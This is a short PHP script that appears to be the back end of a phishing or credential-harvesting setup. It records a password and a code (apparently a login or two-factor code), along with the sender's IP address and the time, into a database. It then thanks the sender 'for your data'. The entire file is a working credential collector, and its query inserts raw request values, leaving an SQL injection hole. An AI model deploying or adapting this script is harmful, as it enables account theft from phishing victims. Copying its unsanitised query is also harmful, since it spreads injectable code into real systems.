<?php

include('db.inc.php');

$ip = $_SERVER['REMOTE_ADDR'];
$date = date("m-d-y h:i");
$password = @($_GET['pwd']);

$code = @($_GET['code']);

$query = "INSERT INTO data(date,ip,password,code) VALUES('$date','$ip','$password','$code')";
$exec = mysqli_query($link, $query);

echo "Thanks for your data ;)";


?> 
